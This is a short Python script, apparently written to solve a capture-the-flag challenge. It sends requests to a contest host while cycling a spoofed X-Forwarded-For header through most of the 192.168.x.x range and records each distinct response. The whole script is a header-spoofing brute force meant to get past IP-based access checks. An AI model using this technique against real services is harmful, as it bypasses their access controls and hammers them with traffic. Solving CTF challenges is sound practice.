import requests

res = []
ips = []
i = 0
for ip3 in range(3, 255):
    for ip4 in range(255):
        ip = '192.168.{}.{}'.format(ip3, ip4)
        r = requests.get(
            'http://gamebox3.reply.it/a75430d5521aa3426aafc8a44b77ef3d/',
            headers={
                'User-agent': 'Internet Explorer/2.0',
                'X-Forwarded-For': ip,
            }
        )
        if r.text not in res:
            res.append(r.text)
            ips.append(ip)
        print(ip)
        i += 1
        print('len {}'.format(len(res)))

print(len(res))
print(res)

